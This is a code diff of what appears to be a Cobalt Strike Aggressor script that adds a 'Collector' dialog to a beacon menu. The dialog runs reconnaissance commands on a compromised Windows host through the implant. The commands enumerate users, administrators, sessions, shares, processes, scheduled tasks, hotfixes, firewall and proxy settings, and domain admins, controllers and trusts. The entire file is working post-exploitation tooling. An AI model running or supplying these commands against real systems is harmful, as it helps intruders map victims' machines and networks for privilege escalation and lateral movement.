@@ -1,15 +1,109 @@
 #define functions
 
+local('$bid');
+
+sub sysinfo{
+    btask($bid, "=====Systeminfo=====", "");
+    $info = brun($bid, "whoami");
+    show_message($info);
+}
+
+sub ipconfig{
+    btask($bid, "=====Ipconfig=====", "");
+    bshell($bid, "ipconfig /all");
+}
+
+sub netstat{
+    btask($bid, "=====Connection=====", "");
+    bshell($bid, "netstat -ano | findstr LISTENING");
+}
+
+sub software{
+    btask($bid, "=====Software=====", "");
+    bshell($bid, "wmic product get name,version");
+}
+
+sub ps_soft{
+    btask($bid, "=====Software (powershell)=====", "");
+    bpowershell($bid, 'Get-WmiObject -class Win32_Product | Select-Object -Property name,version');
+}
+
+sub runprocs{
+    btask($bid, "=====Startup process=====", "");
+    bshell($bid, "wmic startup get command,caption");
+}
+
+sub pros_detail{
+    btask($bid, "=====Running process=====", "");
+    bshell($bid, "wmic process get caption,executablepath,commandline");
+}
+
+sub tasks{
+    btask($bid, "=====Task=====", "");
+    bshell($bid, "schtasks /query /fo LIST /v");
+}
+
+sub users{
+    btask($bid, "=====Users=====", "");
+    bshell($bid, "net user && net localgroup administrators && net session && net share");
+}
+
+sub hotfix{
+    btask($bid, "=====Hotfix=====", "");
+    bshell($bid, "wmic qfe get Caption,Description,HotFixID,InstalledOn");
+}
+
+sub firewall{
+    btask($bid, "=====Firewall=====", "");
+    bshell($bid, "netsh firewall show config");
+}
+
+sub proxy{
+    btask($bid, "=====Proxy=====", "");
+    breg_query($bid, "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "x64");
+}
+
+sub domain{
+    btask($bid, "=====Domain=====", "");
+    btask($bid, "Part One", "");
+    bshell($bid, "net view /domain && net group /domain && net group \"domain computers\" /domain && net accounts /domain && net group \"Domain Controllers\" /domain ");
+    btask($bid, "Part Two", "");
+    bshell($bid, "Nslookup -type=SRV _ldap._tcp && nltest /domain_trusts && netdom query pdc");
+    btask($bid, "Part Tree", "");
+    bshell($bid, "net user /domain && wmic useraccount get /all && dsquery user && net group \"domain admins\" /domain");
+}
+
+sub main{
+    #show_message($3);
+    foreach $func (keys($3)){
+        if ($3[$func] eq 'true'){
+            eval($func.'();');
+        }
+    }
+}
+
 
 #append menus
 
     menu "Gather"{
-        item "Process Detail"{
-            local('$bid');
-            $bid = $1;
-            if ( -isadmin $bid['@'] ){
-                bshell($bid,"wmic process get caption,executablepath,commandline");
-                return;
-            }
+        item "Collector"{
+            $bid = $1['@'];
+            $dialog = dialog("Gather Informations",%(bid => $bid), &main);
+            dialog_description($dialog, "Collect information about the target host");
+            drow_checkbox($dialog, "sysinfo", "System informations", "");
+            drow_checkbox($dialog, "ipconfig", "Network card configuration information", "");
+            drow_checkbox($dialog, "netstat", "Network connection list", "");
+            drow_checkbox($dialog, "software", "Installed software list", "");
+            drow_checkbox($dialog, "ps_soft", "Installed software list(use powershell)", "");
+            drow_checkbox($dialog, "runprocs", "Startup processes list", "");
+            drow_checkbox($dialog, "pros_detail", "Running processes list", "");
+            drow_checkbox($dialog, "tasks", "Schedule task list", "");
+            drow_checkbox($dialog, "users", "Local users , administrators , share and sessions list", "");
+            drow_checkbox($dialog, "hotfix", "Hotfix list", "");
+            drow_checkbox($dialog, "firewall", "Firewall configuration information", "");
+            drow_checkbox($dialog, "proxy", "System proxy configuration information", "");
+            drow_checkbox($dialog, "domain", "Domain informations", "");
+            dbutton_action($dialog, "Run");
+            dialog_show($dialog);
         }
     }
